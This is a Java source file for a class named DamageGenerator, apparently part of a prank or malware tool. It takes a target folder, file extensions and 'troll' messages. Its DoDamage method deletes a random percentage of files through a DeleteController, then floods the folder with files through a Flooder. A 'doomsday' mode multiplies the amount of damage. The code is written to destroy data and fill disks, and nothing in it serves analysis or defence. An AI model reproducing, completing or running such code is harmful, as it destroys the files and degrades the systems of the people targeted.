
package com;

import java.io.File;
import java.util.Random;

public class DamageGenerator {
	private static int damage, percent;
	private static String message[], extentions[];
	private static File path;
	private static boolean random = false, doomsDayMode = false, delete = false;

	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[], boolean random, int percent, boolean doomsday, boolean delete) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.random = random;
		DamageGenerator.doomsDayMode = doomsday;
		DamageGenerator.delete = delete;
		DamageGenerator.message = trollMessage;
		DamageGenerator.percent = percent;
	}

	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[]) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.message = trollMessage;
	}

	public DamageGenerator(int damage, File path, String extentions[], boolean random, int percent, boolean doomsday, boolean delete) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.random = random;
		DamageGenerator.doomsDayMode = doomsday;
		DamageGenerator.delete = delete;
		DamageGenerator.percent = percent;
	}

	public DamageGenerator(int damage, File path, String extentions[]) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
	}

	public void DoDamage() {
		if (delete) {
			Deleting();
		}
		if (doomsDayMode) {
			damage *= (extentions.length + 1);
		}
		Flooder flooder = new Flooder(damage, path, extentions);
		if (random) {
			flooder.RandomFlood();
		} else {
			flooder.Flood();
		}

	}

	private static void Deleting() {
		DeleteController deleteController = new DeleteController(path, percent);
		deleteController.DeleteRandomStuff();
	}
}
